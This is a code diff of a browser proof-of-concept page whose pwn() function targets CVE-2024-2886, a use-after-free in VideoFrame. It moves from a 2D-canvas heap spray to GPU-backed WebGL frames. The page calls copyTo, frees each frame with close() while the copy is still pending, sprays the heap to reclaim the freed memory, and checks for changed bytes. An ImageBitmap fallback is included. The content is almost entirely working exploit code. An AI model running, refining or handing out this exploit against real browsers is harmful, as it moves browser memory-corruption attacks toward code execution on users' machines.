@@ -7,87 +7,118 @@
 const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
 
 async function pwn() {
-    log('CVE-2024-2886 — UAF heap spray verification');
+    log('CVE-2024-2886 — GPU-backed VideoFrame UAF');
+    log('Using WebGL canvas for GPU-backed frames');
     log('');
 
-    // First: what does normal copyTo return? (no close)
+    // Create GPU-backed VideoFrame via WebGL canvas
+    // WebGL frames are GPU-resident, triggering the real GPU readback UAF
     const canvas = new OffscreenCanvas(64, 64);
-    const ctx = canvas.getContext('2d');
-    // Fill with known pattern: pure red = YUV Y=81 Cb=90 Cr=240
-    ctx.fillStyle = '#ff0000';
-    ctx.fillRect(0, 0, 64, 64);
+    const gl = canvas.getContext('webgl') || canvas.getContext('webgl2');
 
-    const frameNormal = new VideoFrame(canvas, { timestamp: 0 });
-    const bufNormal = new Uint8Array(frameNormal.allocationSize());
-    await frameNormal.copyTo(bufNormal);
-    frameNormal.close();
-    const normalHex = Array.from(bufNormal.slice(0, 16))
+    if (!gl) {
+        log('[!] WebGL not available, trying experimental-webgl...');
+        // Fallback: try ImageBitmap path
+        return await tryImageBitmapUAF();
+    }
+    log('[+] WebGL context: ' + (gl instanceof WebGL2RenderingContext ? 'WebGL2' : 'WebGL1'));
+
+    // Draw red via WebGL (GPU-resident texture)
+    gl.clearColor(1.0, 0.0, 0.0, 1.0);
+    gl.clear(gl.COLOR_BUFFER_BIT);
+
+    // Baseline: normal copyTo without close
+    const frameBase = new VideoFrame(canvas, { timestamp: 0 });
+    const bufBase = new Uint8Array(frameBase.allocationSize());
+    await frameBase.copyTo(bufBase);
+    frameBase.close();
+    const baseHex = Array.from(bufBase.slice(0, 16))
         .map(x => x.toString(16).padStart(2,'0')).join(' ');
-    log('[baseline] normal copyTo bytes: ' + normalHex);
-    log('[baseline] frame size: ' + bufNormal.length);
+    log('[baseline] ' + baseHex + ' size=' + bufBase.length);
     log('');
 
-    // Now: UAF with heap spray between close() and promise resolution
-    const results = [];
+    // UAF attempts with GPU-backed frames
+    let succeeded = 0, differs = 0;
 
-    for (let attempt = 0; attempt < 10; attempt++) {
-        ctx.fillStyle = '#ff0000'; // always red
-        ctx.fillRect(0, 0, 64, 64);
+    for (let i = 0; i < 20; i++) {
+        // Vary the color each time so we can detect if memory is reused
+        gl.clearColor(i / 20.0, 0.5, 1.0 - i/20.0, 1.0);
+        gl.clear(gl.COLOR_BUFFER_BIT);
+        gl.finish(); // force GPU flush
 
-        const frame = new VideoFrame(canvas, { timestamp: attempt * 1000 });
+        const frame = new VideoFrame(canvas, { timestamp: i * 1000 });
         const size = frame.allocationSize();
         const buf = new Uint8Array(size);
 
-        // Start async copy
+        // GPU readback UAF race
         const promise = frame.copyTo(buf);
+        frame.close(); // free GPU texture while readback in progress
 
-        // Free the frame
-        frame.close();
-
-        // HEAP SPRAY: immediately allocate lots of memory with known pattern
-        // to try to reclaim the freed VideoFrame C++ object
+        // Spray heap to reclaim freed GPU VideoFrame wrapper
         const spray = [];
-        const SPRAY_PATTERN = 0x41; // 'A' = 0x41
-        for (let i = 0; i < 1000; i++) {
-            const s = new Uint8Array(256);
-            s.fill(SPRAY_PATTERN);
+        for (let j = 0; j < 500; j++) {
+            const s = new Uint8Array(512);
+            s.fill(0xBB);
             spray.push(s);
         }
 
-        // Now let copyTo complete - it reads from potentially reclaimed memory
-        const layout = await promise;
-        spray.length = 0; // release
+        try {
+            await promise;
+            succeeded++;
+            spray.length = 0;
 
-        const hex = Array.from(buf.slice(0, 16))
-            .map(x => x.toString(16).padStart(2,'0')).join(' ');
+            const hex = Array.from(buf.slice(0, 16))
+                .map(x => x.toString(16).padStart(2,'0')).join(' ');
+            const diff = buf.some((b, idx) => b !== bufBase[idx]);
+            if (diff) differs++;
 
-        // Check if any bytes differ from baseline (red frame = known pattern)
-        const differs = buf.some((b, i) => b !== bufNormal[i]);
-
-        results.push({ attempt, hex, differs });
-        log('[' + attempt + '] ' + hex + (differs ? ' <<< DIFFERS FROM BASELINE' : ' (same)'));
+            log('[' + i + '] ' + hex + (diff ? ' <<< DIFFERS' : ' (same)'));
+        } catch(e) {
+            spray.length = 0;
+            log('[' + i + '] threw: ' + e.message);
+        }
     }
 
     log('');
-    const anyDiffers = results.some(r => r.differs);
-    if (anyDiffers) {
-        log('REAL UAF CONFIRMED: bytes differ from baseline');
-        log('Freed memory was reclaimed and corrupted by heap spray');
-        log('We have read access to freed/reused C++ VideoFrame memory');
+    log('succeeded: ' + succeeded + '/20  differs: ' + differs + '/20');
+
+    if (differs > 0) {
+        log('REAL GPU UAF CONFIRMED');
+        log('GPU memory freed and reclaimed — exploit path viable');
         return true;
-    } else {
-        log('copyTo succeeds but bytes match baseline');
-        log('Frame memory not immediately reused - refcount may keep it alive');
-        log('UAF exists but needs different exploitation strategy');
-        log('Will try larger spray...');
+    } else if (succeeded === 20) {
+        log('copyTo completes after close but bytes unchanged');
+        log('GPU frame may still be kept alive by readback ref');
+        log('Need hardware-decoded frames for real GPU UAF');
         return 'partial';
+    } else {
+        return false;
     }
 }
 
-pwn().then(r => {
-    log('');
-    log('RESULT: ' + r);
-});
+async function tryImageBitmapUAF() {
+    log('[*] Trying ImageBitmap-backed VideoFrame...');
+    
+    const bitmap = await createImageBitmap(
+        new ImageData(new Uint8ClampedArray(64*64*4).fill(128), 64, 64)
+    );
+    
+    const frame = new VideoFrame(bitmap, { timestamp: 0 });
+    const buf = new Uint8Array(frame.allocationSize());
+    const promise = frame.copyTo(buf);
+    frame.close();
+    
+    try {
+        await promise;
+        log('[+] ImageBitmap UAF: copyTo succeeded after close');
+        return 'partial';
+    } catch(e) {
+        log('[!] threw: ' + e.message);
+        return false;
+    }
+}
+
+pwn().then(r => { log(''); log('RESULT: ' + r); });
 </script>
 </body>
 </html>
